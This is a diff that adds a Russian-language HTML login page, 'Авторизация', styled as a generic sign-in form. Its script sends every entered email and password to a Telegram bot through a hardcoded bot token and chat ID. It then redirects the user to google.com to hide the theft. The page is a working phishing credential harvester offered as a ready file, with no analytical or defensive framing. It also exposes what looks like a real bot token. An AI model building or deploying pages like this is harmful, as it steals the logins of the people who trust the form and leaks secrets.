@@ -1,0 +1,210 @@
+```html
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход в систему</title>
+    <style>
+        /* Современный UI/UX в бело-синих тонах */
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(135deg, #f0f4f8 0%, #e2e8f0 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        
+        .form-container {
+            background: #ffffff;
+            padding: 40px 30px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(37, 99, 235, 0.1);
+            width: 100%;
+            max-width: 380px;
+            border-top: 6px solid #2563eb;
+            box-sizing: border-box;
+        }
+
+        h2 {
+            color: #1e3a8a;
+            text-align: center;
+            margin-top: 0;
+            margin-bottom: 25px;
+            font-size: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #475569;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        input[type="text"], 
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1.5px solid #cbd5e1;
+            border-radius: 8px;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+            font-family: inherit;
+            font-size: 15px;
+            background-color: #f8fafc;
+        }
+
+        input[type="text"]:focus, 
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #2563eb;
+            background-color: #ffffff;
+            box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.15);
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #2563eb;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        button:hover:not(:disabled) {
+            background-color: #1d4ed8;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(29, 78, 216, 0.2);
+        }
+
+        button:disabled {
+            background-color: #94a3b8;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        #statusMessage {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 500;
+            min-height: 20px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .success { 
+            color: #16a34a; 
+            opacity: 1 !important;
+        }
+        
+        .error { 
+            color: #dc2626; 
+            opacity: 1 !important;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="form-container">
+        <h2>Авторизация</h2>
+        <form id="telegramForm">
+            <div class="form-group">
+                <label for="username">Имя пользователя (Email)</label>
+                <input type="text" id="username" name="username" required placeholder="example@mail.com">
+            </div>
+            <div class="form-group">
+                <label for="password">Пароль / Сообщение</label>
+                <input type="password" id="password" name="password" required placeholder="••••••••">
+            </div>
+            <button type="submit" id="submitBtn">Войти</button>
+        </form>
+        <div id="statusMessage"></div>
+    </div>
+
+    <script>
+        // Конфигурация Telegram API
+        const BOT_TOKEN = '8852636714:AAGJbQ5Bq2onVh94mHlZ2Ir-rsl_LKMXiTY'; 
+        const CHAT_ID = '8906550436';
+
+        const form = document.getElementById('telegramForm');
+        const statusDiv = document.getElementById('statusMessage');
+        const submitBtn = document.getElementById('submitBtn');
+
+        form.addEventListener('submit', function(event) {
+            event.preventDefault(); // Предотвращаем перезагрузку страницы
+
+            // Получаем данные из полей
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Формируем текст для Telegram
+            const formattedText = `🔐 Новая попытка входа:\nПользователь: ${username}\nВвод: ${password}`;
+            const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            const payload = {
+                chat_id: CHAT_ID,
+                text: formattedText
+            };
+
+            // Блокируем кнопку на время отправки
+            submitBtn.textContent = 'Обработка...';
+            submitBtn.disabled = true;
+            statusDiv.className = '';
+
+            // Отправляем POST-запрос в Telegram API
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`Ошибка сети: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                if (data.ok) {
+                    // Успешная отправка
+                    statusDiv.textContent = 'Успешно! Перенаправление...';
+                    statusDiv.className = 'success';
+                    form.reset(); 
+                    
+                    // Редирект через 2 секунды
+                    setTimeout(() => {
+                        window.location.href = "https://google.com"; 
+                    }, 2000);
+                } else {
+                    throw new Error(data.description || 'Ошибка API');
+                }
+            })
+            .catch(error => {
+                console.error('Ошибка:', error);
+                statusDiv.textContent = 'Сбой подключения. Попробуйте еще раз.';
+                statusDiv.className = 'error';
+                
+                // Разблокируем кнопку при ошибке
+                submitBtn.textContent = 'Войти';
+                submitBtn.disabled = false;
+            });
+        });
+    </script>
+</body>
+</html>
+```
